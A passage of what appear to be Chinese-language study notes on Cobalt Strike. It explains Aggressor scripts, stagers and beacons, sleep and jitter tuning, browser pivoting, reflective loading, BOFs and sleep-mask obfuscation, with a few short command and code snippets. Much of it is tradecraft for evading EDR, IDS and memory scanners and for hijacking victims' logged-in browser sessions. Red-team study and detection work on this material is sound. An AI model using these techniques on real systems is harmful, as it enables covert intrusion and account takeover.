请求</td></tr><tr><td><code>popup</code></td><td>自定义右键菜单</td></tr><tr><td><code>artifact()</code></td><td>自动生成 Payload 文件</td></tr><tr><td><code>open</code></td><td>弹出输入框&#x2F;对话框</td></tr><tr><td><code>dialog_text</code></td><td>自定义图形输入对话框</td></tr></tbody></table><hr><h2 id="Aggressor-Script-编写-加载"><a href="#Aggressor-Script-编写-加载" class="headerlink" title="Aggressor Script 编写&amp;加载"></a>Aggressor Script 编写&amp;加载</h2><h3 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h3><p>以 <code>.cna</code> 为后缀名（Cobalt Strike Native Aggressor）</p><p>例如：<code>autorun.cna</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line">  <span class="title function_">println</span>(<span class="string">&quot;Beacon上线啦！&quot;</span>);</span><br><span class="line">  <span class="title function_">binput</span>($1, <span class="string">&quot;whoami\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加载方式"><a href="#加载方式" class="headerlink" title="加载方式"></a>加载方式</h3><p>在 GUI 的 <strong>Cobalt Strike → Scripts</strong> 菜单中点击 Load，选中你的 <code>.cna</code> 脚本即可。</p><p>也可以用命令行加载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike.client -&gt; Scripts -&gt; Load -&gt; autorun.cna</span><br></pre></td></tr></table></figure><h1 id="Beacon-Stager-Stage-Listener"><a href="#Beacon-Stager-Stage-Listener" class="headerlink" title="Beacon Stager Stage Listener"></a>Beacon Stager Stage Listener</h1><h2 id="1-Listener：监听器"><a href="#1-Listener：监听器" class="headerlink" title="1. Listener：监听器"></a>1. Listener：监听器</h2><p><strong>作用：</strong><br>Listener 是 Cobalt Strike 设置的一个“通信入口”，用来监听 Beacon 的回连请求。</p><ul><li>每个 Listener 对应一个通信协议（HTTP&#x2F;HTTPS&#x2F;DNS&#x2F;SMB&#x2F;TCP 等）。</li><li>在 TeamServer 上配置后，Beacon 就通过这个 Listener 回连。</li></ul><hr><h2 id="2-Stager：阶段载荷加载器（小型启动器）"><a href="#2-Stager：阶段载荷加载器（小型启动器）" class="headerlink" title="2. Stager：阶段载荷加载器（小型启动器）"></a>2. Stager：阶段载荷加载器（小型启动器）</h2><p><strong>作用：</strong><br>Stager 是一个体积极小的初始 payload，专门用来从 C2 下载真正的 Beacon（也就是 stage），目的是减小落地载荷体积，方便绕过防御。</p><p><strong>流程：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[目标主机] ←→ [Stager 载荷] → 请求 Listener → 下载完整 Beacon（stage） → 注入执行</span><br></pre></td></tr></table></figure><p><strong>特点：</strong></p><ul><li>体积小（几 KB）；</li><li>可以是 shellcode、PowerShell、一段 exe，也可以是 exploit payload；</li><li>有点像“下载器”，用来拉取主菜。</li></ul><hr><h2 id="3-Stage：主载荷（Beacon）"><a href="#3-Stage：主载荷（Beacon）" class="headerlink" title="3. Stage：主载荷（Beacon）"></a>3. Stage：主载荷（Beacon）</h2><p><strong>作用：</strong><br>Stage 就是完整功能的 Beacon，包含所有核心逻辑（通信模块、命令处理、内存管理、插件加载等）。</p><p>当 Stager 成功运行，会连接 Listener 获取完整的 Beacon（二进制代码）并加载到内存执行。</p><p><strong>特点：</strong></p><ul><li>可以反射注入，不落地；</li><li>功能完整，可持久化通信；</li><li>体积大（几十到几百 KB）。</li></ul><hr><h2 id="4-Beacon：Cobalt-Strike-的客户端"><a href="#4-Beacon：Cobalt-Strike-的客户端" class="headerlink" title="4. Beacon：Cobalt Strike 的客户端"></a>4. Beacon：Cobalt Strike 的客户端</h2><p><strong>作用：</strong><br>Beacon 是 Cobalt Strike 的 implant，它和 Team Server 通信，等待执行命令。它是 CS 攻击链的核心。</p><p><strong>Beacon 的能力：</strong></p><ul><li>命令执行；</li><li>文件上传下载；</li><li>横向移动；</li><li>注入其他进程；</li><li>内存加载模块（BOF）；</li><li>通信自适应（切换 sleep、切换通道）；</li><li>模拟键盘、屏幕截图、凭证抓取等等。</li></ul><hr><h2 id="举个例子（完整流程）"><a href="#举个例子（完整流程）" class="headerlink" title="举个例子（完整流程）"></a>举个例子（完整流程）</h2><p>假设使用的是 <code>windows/beacon_http/reverse_http</code> 类型的 payload：</p><ol><li>创建一个 HTTP 类型的 Listener；</li><li>生成一个 Stager（例如 PowerShell 脚本）；</li><li>用户执行这个 Stager，Stager 向 Listener 发起请求；</li><li>Listener 下发完整的 Stage（Beacon）；</li><li>Beacon 加载成功，建立持久会话；</li><li>后续所有操作通过 Beacon 通信完成。</li></ol><hr><h2 id="简单对比总结"><a href="#简单对比总结" class="headerlink" title="简单对比总结"></a>简单对比总结</h2><table><thead><tr><th>名称</th><th>本质</th><th>作用</th><th>是否落地</th></tr></thead><tbody><tr><td>Listener</td><td>通信服务端口</td><td>Beacon 的接收点</td><td>是</td></tr><tr><td>Stager</td><td>小型载荷下载器</td><td>下载主载荷（stage）</td><td>可落地</td></tr><tr><td>Stage</td><td>完整的 Beacon</td><td>植入目标并执行命令</td><td>通常内存</td></tr><tr><td>Beacon</td><td>客户端（implant）</td><td>和 C2 通信、收发命令</td><td>通常内存</td></tr></tbody></table><hr><h2 id="实战中常见使用方式"><a href="#实战中常见使用方式" class="headerlink" title="实战中常见使用方式"></a>实战中常见使用方式</h2><ul><li><strong>Staged Payload（默认方式）：</strong><br>小载荷负责拉取大载荷，隐蔽性高，但被拦截风险大（多阶段）。</li><li><strong>Stageless Payload（不分段）：</strong><br>Beacon 一次性打包在 payload 中，适合写 shellcode loader，体积大但部署简单，绕杀更灵活。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成一个包含完整 beacon 的 shellcode</span></span><br><span class="line">生成方式：Attacks → Packages → Payload Generator → stageless</span><br></pre></td></tr></table></figure><hr><h1 id="DPI"><a href="#DPI" class="headerlink" title="DPI"></a>DPI</h1><p><strong>DPI</strong> 是 <strong>Deep Packet Inspection（深度包检测）</strong> 的缩写，是一种网络安全技术，用于深入分析网络通信数据包的内容，而不仅仅是查看数据包的表面信息（如头部信息）。DPI 可以通过检查网络数据包的每一层内容，帮助检测和阻止各种网络威胁、恶意活动和合规性问题。</p><p>DPI 在数据包传输过程中逐个检查数据包的每一部分，尤其是数据部分（Payload），以便进行深层次的分析。它与传统的 <strong>包过滤</strong> 技术不同，后者通常只检查数据包的头部信息，如源地址、目的地址、端口号等。</p><ol><li><strong>数据包捕获</strong>：DPI 设备（例如防火墙、入侵检测系统 IDS、入侵防御系统 IPS）在网络中捕获传输的数据包。</li><li><strong>协议分析</strong>：DPI 会解析数据包的每一层协议（例如 IP、TCP、HTTP、DNS 等），并对内容进行深度检查。</li><li><strong>模式匹配</strong>：它会查找已知的攻击模式、恶意软件签名或协议的异常行为。</li><li><strong>内容检查</strong>：它检查数据包中的内容，包括文件、电子邮件、网页内容、应用数据等，来识别潜在的恶意行为或泄露的信息。</li></ol><hr><h1 id="Cobalt-Strike-的心跳检测"><a href="#Cobalt-Strike-的心跳检测" class="headerlink" title="Cobalt Strike 的心跳检测"></a>Cobalt Strike 的心跳检测</h1><h2 id="Cobalt-Strike-的心跳检测机制"><a href="#Cobalt-Strike-的心跳检测机制" class="headerlink" title="Cobalt Strike 的心跳检测机制"></a>Cobalt Strike 的心跳检测机制</h2><p>Cobalt Strike 的心跳检测机制是用来保持目标系统与 Cobalt Strike 服务器之间稳定连接的技术，防止因网络防御系统（如防火墙、入侵检测系统 IDS）检测到长时间没有活动而切断连接。通过定期发送“心跳包”，Cobalt Strike 可以保持与目标系统的通信，确保不会被中断。</p><h2 id="Beacon-的心跳机制是怎么工作的"><a href="#Beacon-的心跳机制是怎么工作的" class="headerlink" title="Beacon 的心跳机制是怎么工作的"></a>Beacon 的心跳机制是怎么工作的</h2><p>Beacon 是被控端，在目标机器里运行后，它会定时主动向 C2（Team Server）“打个招呼”，看看有没有新命令。这个定时打招呼的行为就叫做“心跳”或“回连”。</p><h3 id="核心机制"><a href="#核心机制" class="headerlink" title="核心机制"></a>核心机制</h3><ul><li><strong>通信方式</strong>：Beacon 主动发起 HTTP、HTTPS、DNS、SMB 等请求，向监听器询问“有命令没？”</li><li><strong>非长连接</strong>：Beacon 不是 WebSocket 这种实时长连接，而是<strong>轮询式短连接</strong>。</li><li><strong>状态无感知</strong>：Beacon 和 Team Server 没有持久连接，断了也不会立刻知道，只能通过心跳间隔判断“它是不是还活着”。</li></ul><hr><h2 id="关键参数：sleep-和-jitter"><a href="#关键参数：sleep-和-jitter" class="headerlink" title="关键参数：sleep 和 jitter"></a>关键参数：sleep 和 jitter</h2><p>Cobalt Strike 中，Beacon 心跳频率是可以<strong>精细配置</strong>的，两个最重要的参数是：</p><h3 id="1-sleep"><a href="#1-sleep" class="headerlink" title="1. sleep"></a>1. <code>sleep</code></h3><ul><li>表示 Beacon 每次执行完任务后，<strong>等待多长时间再去联系 Team Server</strong>。</li><li>默认值是 60 秒，实际操作中推荐设置得更长（比如 150s、300s），降低被发现的概率。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 150</span><br></pre></td></tr></table></figure><h3 id="2-jitter"><a href="#2-jitter" class="headerlink" title="2. jitter"></a>2. <code>jitter</code></h3><ul><li>用来“抖动” sleep 的时间，避免 Beacon 以<strong>固定频率通信被检测</strong>。</li><li>jitter 是一个百分比，例如：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 120 30</span><br></pre></td></tr></table></figure><p>表示每次 Beacon 回连的时间为 <strong>120 秒 ± 30%</strong>，即 84~156 秒之间波动。</p><hr><h2 id="Beacon-的心跳行为具体细节"><a href="#Beacon-的心跳行为具体细节" class="headerlink" title="Beacon 的心跳行为具体细节"></a>Beacon 的心跳行为具体细节</h2><ol><li>Beacon 每次 sleep 结束，发起一次请求（HTTP&#x2F;DNS&#x2F;…）；</li><li>请求内容包括机器信息、任务请求、状态信息等；</li><li>Team Server 返回命令（如果有的话）；</li><li>Beacon 执行命令，把结果下一次心跳上传；</li><li>重复上述流程。</li></ol><h3 id="重要特性"><a href="#重要特性" class="headerlink" title="重要特性"></a>重要特性</h3><ul><li><strong>非交互性命令</strong>会等下一次心跳才收到；</li><li><strong>交互式命令</strong>（比如 shell、powershell）会切换为短 sleep，模拟“实时”交互；</li><li>当 Beacon 检测不到 C2 时，会自动重试，但重试间隔也基于 sleep 配置。</li></ul><hr><h2 id="配置-Beacon-的心跳行为"><a href="#配置-Beacon-的心跳行为" class="headerlink" title="配置 Beacon 的心跳行为"></a>配置 Beacon 的心跳行为</h2><p>Cobalt Strike 中可以通过 Beacon Console 配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置 Beacon 每 120 秒上线一次，jitter 为 30%</span></span><br><span class="line"><span class="built_in">sleep</span> 120 30</span><br></pre></td></tr></table></figure><p>还可以使用 Aggressor Script 来自动配置每个新上线的 Beacon：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line">  <span class="title function_">binput</span>($1, <span class="string">&quot;sleep 300 20\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="如何检测-Beacon-是否还活着"><a href="#如何检测-Beacon-是否还活着" class="headerlink" title="如何检测 Beacon 是否还活着"></a>如何检测 Beacon 是否还活着</h2><p>Team Server 端会根据 Beacon 的心跳记录来判断状态：</p><ul><li>如果超出 sleep + jitter 的预期窗口未上线，就会在 Beacon 列表中标红；</li><li>可以主动发送命令看看是否响应，间接判断会话是否失效。</li></ul><hr><h2 id="与流量检测的关系"><a href="#与流量检测的关系" class="headerlink" title="与流量检测的关系"></a>与流量检测的关系</h2><p>很多 IDS&#x2F;EDR 就是靠检测 Beacon 的“心跳行为”来识别 C2 通信的：</p><ul><li>长时间无用户交互却持续访问某 IP；</li><li>心跳周期固定；</li><li>请求包格式特征明显（如固定 URI、User-Agent）。</li></ul><h3 id="对策"><a href="#对策" class="headerlink" title="对策"></a>对策</h3><ul><li>配置合理的 sleep + jitter；</li><li>使用 DNS、HTTPS 通信掩盖真实内容；</li><li>配合 Malleable C2 伪装请求头、URL、响应体；</li><li>使用分布式 Beacon（SMB 内网跳板、TCP 链式 Beacon）减小出网频率。</li></ul><h1 id="Beacon-的通信机制"><a href="#Beacon-的通信机制" class="headerlink" title="Beacon 的通信机制"></a>Beacon 的通信机制</h1><h2 id="Beacon-的通信模式：交互式-vs-非交互式"><a href="#Beacon-的通信模式：交互式-vs-非交互式" class="headerlink" title="Beacon 的通信模式：交互式 vs 非交互式"></a>Beacon 的通信模式：交互式 vs 非交互式</h2><h3 id="默认：非交互式（非实时）"><a href="#默认：非交互式（非实时）" class="headerlink" title="默认：非交互式（非实时）"></a>默认：非交互式（非实时）</h3><p>Beacon 默认是在 sleep 间隔内轮询式通信，它执行一个命令，结果等下次回连才传回来。这种模式叫 <strong>non-interactive mode</strong>，优点是隐蔽，缺点是慢。</p><h3 id="临时：交互式（实时）"><a href="#临时：交互式（实时）" class="headerlink" title="临时：交互式（实时）"></a>临时：交互式（实时）</h3><p>当操作人员在 Beacon 控制台中使用一些<strong>交互性很强的命令</strong>时，比如：</p><ul><li><code>shell</code> &#x2F; <code>powershell</code>（临时打开一个 shell）；</li><li><code>execute-assembly</code>（手动操作 .NET 程序）；</li><li><code>keylogger</code>；</li><li><code>browserpivot</code>。</li></ul><p>Beacon 会临时切换为交互式模式，将 sleep 调整为极短（比如 1s），频繁回连，实现“实时命令响应”。</p><p><strong>注意：</strong></p><ul><li>交互结束后，会自动恢复原本 sleep。</li><li>如果遇到防火墙、代理、NDR 监控，频繁访问可能暴露。</li></ul><p>可以通过命令显式切换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时设置为 5 秒 sleep 进行交互</span></span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line"><span class="comment"># 恢复为 300s</span></span><br><span class="line"><span class="built_in">sleep</span> 300</span><br></pre></td></tr></table></figure><hr><h2 id="Sleep-Mask-睡眠混淆机制"><a href="#Sleep-Mask-睡眠混淆机制" class="headerlink" title="Sleep Mask 睡眠混淆机制"></a>Sleep Mask 睡眠混淆机制</h2><p>这个是高阶 OPSEC 配置的核心功能之一，尤其针对 <strong>内存扫描</strong> 和 <strong>行为监控</strong> 非常重要。</p><h3 id="问题背景："><a href="#问题背景：" class="headerlink" title="问题背景："></a>问题背景：</h3><p>Beacon 在 sleep 过程中虽然没在通信，但它的代码&#x2F;数据依然在内存里，这很容易被杀软扫描器查到。</p><p>例如：</p><ul><li>某段 Beacon shellcode 一直驻留在内存；</li><li>某个 DLL 被挂起但签名异常；</li><li>某进程占用高权限但无 UI。</li></ul><h3 id="什么是-Sleep-Mask？"><a href="#什么是-Sleep-Mask？" class="headerlink" title="什么是 Sleep Mask？"></a>什么是 Sleep Mask？</h3><p>Sleep Mask 是一种“<strong>睡眠时清理痕迹</strong>”的技术机制。其核心思想是：</p><p>Beacon 进入 sleep 前自动清空&#x2F;加密自己的内存区域，只留下一个极简的恢复 stub。</p><h3 id="工作流程："><a href="#工作流程：" class="headerlink" title="工作流程："></a>工作流程：</h3><ol><li>Beacon 准备 sleep → 保存状态；</li><li>清空或加密自身的内存（包括代码段）；</li><li>挂起自己，等待定时器触发；</li><li>时间到 → 恢复自身代码 → 继续执行下一步。</li></ol><h3 id="开启方式："><a href="#开启方式：" class="headerlink" title="开启方式："></a>开启方式：</h3><p>需要配合 BOF 模块，比如使用 <code>sleep_mask</code> BOF，可以让 Beacon 在每次 sleep 时执行自我抹除。</p><p>社区里也有不少自定义 Sleep Mask 的 BOF，如：</p><ul><li>Ekko（ETW Patch + APC 调度）；</li><li>Schlock（挂起线程 + shellcode trampoline）；</li><li>Sigrun 等。</li></ul><hr><h2 id="如何绕过-Beacon-心跳特征检测"><a href="#如何绕过-Beacon-心跳特征检测" class="headerlink" title="如何绕过 Beacon 心跳特征检测"></a>如何绕过 Beacon 心跳特征检测</h2><p>因为 Beacon 的心跳行为很像“机器人”，所以流量检测系统（EDR&#x2F;NDR&#x2F;IDS）特别爱抓这类流量。</p><p>以下是一些常见对抗方式：</p><h3 id="1-使用-Malleable-C2-伪装流量"><a href="#1-使用-Malleable-C2-伪装流量" class="headerlink" title="1. 使用 Malleable C2 伪装流量"></a>1. 使用 Malleable C2 伪装流量</h3><ul><li>修改 Beacon 的通信 URL（如 <code>/status-check</code> → <code>/cdn/api</code>）；</li><li>修改 User-Agent（模拟 Chrome、Edge）；</li><li>添加合法 Referer、Cookie；</li><li>响应体伪装成 JSON&#x2F;XML 图片资源。</li></ul><h3 id="2-调整-sleep-jitter"><a href="#2-调整-sleep-jitter" class="headerlink" title="2. 调整 sleep + jitter"></a>2. 调整 sleep + jitter</h3><ul><li>把 sleep 调长（如 300s），jitter 拉高（如 40%）；</li><li>多个 Beacon 不要统一间隔上线，错开上线时间；</li><li>随机插入长时间 sleep，模拟“挂机机器”。</li></ul><h3 id="3-分离通信链路"><a href="#3-分离通信链路" class="headerlink" title="3. 分离通信链路"></a>3. 分离通信链路</h3><ul><li>利用 <strong>SMB Beacon</strong>、<strong>TCP Beacon</strong> 建立内网链路；</li><li>让真正出网通信的 Beacon 更少、更稳；</li><li>内部横向全部通过内网代理。</li></ul><h3 id="4-使用-DNS-通信"><a href="#4-使用-DNS-通信" class="headerlink" title="4. 使用 DNS 通信"></a>4. 使用 DNS 通信</h3><ul><li>利用 DNS Query 发出命令请求；</li><li>响应藏在 TXT 记录或 CNAME 返回中；</li><li>流量更像正常 DNS 解析行为，但带宽较小。</li></ul><h3 id="5-动态加载-Beacon（反射注入）"><a href="#5-动态加载-Beacon（反射注入）" class="headerlink" title="5. 动态加载 Beacon（反射注入）"></a>5. 动态加载 Beacon（反射注入）</h3><ul><li>Beacon 不驻留内存，而是使用 loader 每次注入后即销毁；</li><li>可结合 sleep mask + reflect loader 实现极端隐蔽。</li></ul><hr><h1 id="Browser-Pivot"><a href="#Browser-Pivot" class="headerlink" title="Browser Pivot"></a>Browser Pivot</h1><p><strong>Browser Pivot（浏览器代理或浏览器跳板）</strong> 是一种高级的后渗透技术，主要用于在已经控制的目标主机上<strong>劫持其浏览器会话</strong>，从而<strong>利用目标用户已登录的浏览器身份访问内部资源、Web应用或系统</strong>，而无需再次进行身份认证。帮助攻击者利用目标主机已有的“合法身份”进行更深层次的横向渗透或数据访问。</p><hr><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>你渗透进了一台内网机器，这台机器的用户正在用浏览器访问公司内部的OA系统或开发平台（并已登录），你没有这个系统的账号密码。但通过 Browser Pivot，你可以<strong>借用他的浏览器身份</strong>，以他的权限去访问那些系统，就像你坐在他电脑前操作一样。</p><hr><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ol><li><strong>建立 Beacon 会话</strong>：<ul><li>攻击者通过 Cobalt Strike 控制目标主机，并植入了 Beacon（即后门）。</li></ul></li><li><strong>启用 Browser Pivot</strong>：<ul><li>在 Beacon 中执行 <code>browserpivot</code> 命令，Cobalt Strike 会注入一个 DLL 到目标机器的浏览器进程中（如 Chrome、Edge 或 IE）。</li><li>这个 DLL 会<strong>拦截浏览器发出的 HTTP 请求</strong>，并将其代理转发到 Cobalt Strike。</li></ul></li><li><strong>设置 SOCKS 代理</strong>：<ul><li>攻击者可以在自己的机器上设置一个 SOCKS 代理，并通过这个代理访问目标浏览器“正在登录”的 Web 应用。</li><li>所有请求都是从目标机器浏览器发出的，服务端会认为是“合法用户”的操作。</li></ul></li><li><strong>访问目标内部系统</strong>：<ul><li>攻击者现在可以在自己的浏览器或 Burp Suite 中设置 SOCKS 代理，访问原本无法访问的系统（如内网OA、内网Git、K8s Dashboard等）。</li><li>所有请求都继承了目标用户当前的登录状态（如Cookie、Session等），不需要再次输入账号密码。</li></ul></li></ol><hr><h2 id="与普通代理的区别"><a href="#与普通代理的区别" class="headerlink" title="与普通代理的区别"></a>与普通代理的区别</h2><table><thead><tr><th>特性</th><th>普通代理</th><th>Browser Pivot</th></tr></thead><tbody><tr><td>是否继承登录状态</td><td>❌ 不继承</td><td>✅ 继承浏览器 Cookie、Session</td></tr><tr><td>是否注入浏览器进程</td><td>❌ 不注入</td><td>✅ 注入浏览器进程</td></tr><tr><td>是否可绕过认证</td><td>❌ 需要账号密码</td><td>✅ 可直接用目标已登录会话</td></tr><tr><td>适用目标</td><td>网络层面</td><td>应用层&#x2F;会话层</td></tr></tbody></table><hr><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>浏览器必须是已登录状态</strong>：否则 Browser Pivot 没有意义。</li><li><strong>有些浏览器启用了防注入机制</strong>（特别是新版 Chrome），可能会失败。</li><li><strong>防御方可以通过监测浏览器行为和代理访问异常来识别此类行为</strong>。</li></ul><hr><h1 id="Reflect-Loader"><a href="#Reflect-Loader" class="headerlink" title="Reflect Loader"></a>Reflect Loader</h1><h2 id="Reflective-Loader-是什么"><a href="#Reflective-Loader-是什么" class="headerlink" title="Reflective Loader 是什么"></a>Reflective Loader 是什么</h2><p><strong>Reflective Loader</strong>（反射加载器）是一种内存加载技术，其核心目的是：</p><p><strong>在不依赖操作系统的标准加载机制（如 LoadLibrary）和不落地磁盘的情况下，在内存中手动加载并执行 DLL 或 Shellcode。</strong></p><p>这种技术常用于：</p><ul><li><strong>无文件攻击（Fileless）</strong></li><li><strong>恶意代码注入</strong></li><li><strong>绕过安全软件检测（如 AV &#x2F; EDR）</strong></li><li><strong>Cobalt Strike、Metasploit、BOF 等攻击链中的模块加载</strong></li></ul><hr><h2 id="Reflective-Loader-的基本原理"><a href="#Reflective-Loader-的基本原理" class="headerlink" title="Reflective Loader 的基本原理"></a>Reflective Loader 的基本原理</h2><p>传统加载 DLL 的方式（如 <code>LoadLibrary()</code>）：</p><ul><li>会使用系统 API</li><li>会写入磁盘缓存</li><li>容易被安全软件检测</li></ul><p>而 Reflective Loader：</p><ul><li>自己实现一套完整的 DLL 加载流程</li><li>从内存中加载 DLL（如从 Shellcode、远程注入、网络下载等）</li><li>不依赖 <code>LoadLibrary</code>，也不生成磁盘文件</li><li>可用于执行自定义模块、恶意插件、Beacon 等 payload</li></ul><p><strong>工作流程如下：</strong></p><ol><li><strong>从外部接收到一段 DLL 二进制数据</strong>（可能是加密的，也可能是 shellcode 包裹的）</li><li><strong>Reflective Loader</strong> 在自身内部完成：<ul><li>映射节区</li><li>重定位地址</li><li>修复导入表（Import Address Table）</li><li>处理 TLS 回调</li><li>执行 DLL 的入口函数（<code>DllMain</code>）</li></ul></li><li>整个过程<strong>完全发生在内存中</strong></li></ol><hr><h2 id="Reflective-Loader-常用于哪些地方？"><a href="#Reflective-Loader-常用于哪些地方？" class="headerlink" title="Reflective Loader 常用于哪些地方？"></a>Reflective Loader 常用于哪些地方？</h2><table><thead><tr><th>场景</th><th>描述</th></tr></thead><tbody><tr><td><strong>红队工具</strong></td><td>如 Cobalt Strike 使用 Reflective Loader 加载 Beacon（Payload）到远程进程</td></tr><tr><td><strong>Metasploit</strong></td><td>模块 <code>windows/meterpreter/reverse_https</code><br/> 中的 DLL 加载用的是反射技术</td></tr><tr><td><strong>自定义后门 &#x2F; Dropper</strong></td><td>利用反射加载器解密并运行内存中的 Payload</td></tr><tr><td><strong>绕过安全检测</strong></td><td>避免调用 LoadLibrary 或磁盘读写行为，减少被 AV&#x2F;EDR 检测的机会</td></tr><tr><td><strong>免杀工具链构建</strong></td><td>Loader + Reflective DLL + Beacon 组成一条完整免杀攻击链</td></tr></tbody></table><hr><h2 id="和普通-DLL-加载的区别"><a href="#和普通-DLL-加载的区别" class="headerlink" title="和普通 DLL 加载的区别"></a>和普通 DLL 加载的区别</h2><table><thead><tr><th>项目</th><th>LoadLibrary 加载</th><th>Reflective Loader 加载</th></tr></thead><tbody><tr><td>是否写入磁盘</td><td>是（通常落地）</td><td>否（完全在内存）</td></tr><tr><td>是否使用系统 API</td><td>是</td><td>否（自定义代码）</td></tr><tr><td>是否容易被 AV&#x2F;EDR 拦截</td><td>容易</td><td>更隐蔽</td></tr><tr><td>加载过程</td><td>系统帮你完成</td><td>手动完成节区映射、重定位、导入修复</td></tr><tr><td>支持 Shellcode 包装</td><td>否</td><td>是（常封装成 shellcode）</td></tr></tbody></table><hr><h1 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h1><h2 id="什么是-BOF（Beacon-Object-File）"><a href="#什么是-BOF（Beacon-Object-File）" class="headerlink" title="什么是 BOF（Beacon Object File）"></a>什么是 BOF（Beacon Object File）</h2><h3 id="简单定义"><a href="#简单定义" class="headerlink" title="简单定义"></a>简单定义</h3><p>BOF（Beacon Object File）是 <strong>Cobalt Strike 使用的一种轻量级内存模块</strong>，本质上是用 C 写的 <code>.o</code>（COFF 格式）目标文件，专门设计用于在 Beacon 内部运行的。</p><p>可以理解为：<strong>Beacon 的“内存插件”</strong>。</p><hr><h3 id="为什么需要-BOF"><a href="#为什么需要-BOF" class="headerlink" title="为什么需要 BOF"></a>为什么需要 BOF</h3><p>在早期，Cobalt Strike 想在被控主机上执行一些高级操作（比如获取权限、内存扫描、hook 某模块等），需要：</p><ul><li>上传一个 EXE&#x2F;DLL；</li><li>注入执行；</li><li>或者用 PowerShell 调用。</li></ul><p>问题是这些操作都会：</p><ul><li>落地磁盘 → 容易被查杀；</li><li>调用系统 API 太明显 → EDR 抓得飞起。</li></ul><p>于是引入 BOF 模型：</p><ul><li>用 C 编写轻量逻辑；</li><li>编译成 <code>.o</code> 文件；</li><li>在 Beacon 中由内置解释器运行；</li><li>不需要落地、不调用 CreateProcess、甚至可避开常规 API。</li></ul><hr><h3 id="BOF-的工作原理"><a href="#BOF-的工作原理" class="headerlink" title="BOF 的工作原理"></a>BOF 的工作原理</h3><ol><li>在攻击机编写 BOF 脚本（C 语言）；</li><li>用 MinGW 编译成 <code>.o</code> 文件（COFF 目标文件）；</li><li>用 <code>bof</code> 命令加载 <code>.o</code> 文件进 Beacon；</li><li>Beacon 在内存中调用内置解释器运行；</li><li>操作完成，自动销毁，<strong>内存无残留</strong>。</li></ol><hr><h2 id="Sleep-Mask：与-BOF-结合的隐蔽技术"><a href="#Sleep-Mask：与-BOF-结合的隐蔽技术" class="headerlink" title="Sleep Mask：与 BOF 结合的隐蔽技术"></a>Sleep Mask：与 BOF 结合的隐蔽技术</h2><h3 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h3><p>Beacon 在 sleep 过程中虽然暂停执行，但它的代码&#x2F;数据还在内存，可能被：</p><ul><li>杀软扫描；</li><li>EDR 扫描异常 PE 签名；</li><li>进程注入分析、代码段遍历等。</li></ul><p><strong>Sleep Mask</strong> 的目标就是让 Beacon 在“睡着”的时候彻底“藏起来”。</p><hr><h3 id="Sleep-Mask-原理概述"><a href="#Sleep-Mask-原理概述" class="headerlink" title="Sleep Mask 原理概述"></a>Sleep Mask 原理概述</h3><ol><li>Beacon 准备进入 sleep；</li><li>执行自我擦除逻辑（自我加密&#x2F;清空）；</li><li>设置定时器或挂起；</li><li>到时间后 → 自我恢复，继续工作。</li></ol><h3 id="技术点包括"><a href="#技术点包括" class="headerlink" title="技术点包括"></a>技术点包括</h3><ul><li>加密 <code>.text</code> 段（代码段）；</li><li>抹除函数符号、导入表；</li><li>恢复时重新加载函数地址；</li><li>可选使用 APC、Thread Hijack、ETW Patch 技术隐匿恢复动作。</li></ul><hr><h3 id="BOF-如何实现-Sleep-Mask"><a href="#BOF-如何实现-Sleep-Mask" class="headerlink" title="BOF 如何实现 Sleep Mask"></a>BOF 如何实现 Sleep Mask</h3><p>Sleep Mask 逻辑通常是通过一个专用的 BOF 模块完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">go</span><span class="params">(<span class="type">char</span> *args, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    mask_beacon();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>mask_beacon()</code> 是封装好的加密&#x2F;清除主模块代码逻辑；</li><li>BOF 执行后，Beacon 的内存内容在 sleep 期间完全变形；</li><li>到时间后自动解密，还原执行流程。</li></ul><p>有些 BOF 甚至还可以：</p><ul><li><strong>动态修改 Beacon 模块结构</strong>；</li><li><strong>使用 syscalls 替代 WinAPI 进行内存操作</strong>；</li><li><strong>完全避免调用敏感函数</strong>（CreateThread、VirtualAlloc 等）。</li></ul><hr><h2 id="Sleep-Mask-BOF-的组合优势"><a href="#Sleep-Mask-BOF-的组合优势" class="headerlink" title="Sleep Mask + BOF 的组合优势"></a>Sleep Mask + BOF 的组合优势</h2><table><thead><tr><th>项目</th><th>传统方式</th><th>BOF 